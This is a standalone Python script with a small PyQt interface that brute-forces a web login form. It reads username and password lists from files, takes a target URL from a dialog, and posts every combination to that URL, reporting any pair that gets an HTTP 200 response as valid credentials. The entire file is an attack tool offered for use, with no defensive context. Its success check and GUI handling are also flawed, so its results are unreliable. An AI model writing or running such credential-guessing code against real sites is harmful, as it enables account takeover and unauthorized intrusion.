import requests
from PyQt5.QtWidgets import QApplication, QInputDialog, QLabel, QVBoxLayout, QWidget

def brute_force(username_file, password_file):
    with open(username_file, 'r') as user_file:
        usernames = user_file.read().splitlines()

    with open(password_file, 'r') as pass_file:
        passwords = pass_file.read().splitlines()

    app = QApplication([])
    url, ok = QInputDialog.getText(None, 'URL Input', 'Enter the URL:')
    if not ok:
        print('URL input canceled')
        return
    label = QLabel()
    layout = QVBoxLayout()
    layout.addWidget(label)
    widget = QWidget()
    widget.setLayout(layout)
    widget.show()

    for username in usernames:
        for password in passwords:
            response = requests.post(url, data={'username': username, 'password': password})
            if response.status_code == 200:
                label.setText(f'Successful login! Username: {username}, Password: {password}')
                return
            
    label.setText('Brute force attack unsuccessful')
    app.exec_()

brute_force('usernames.txt', 'passwords.txt')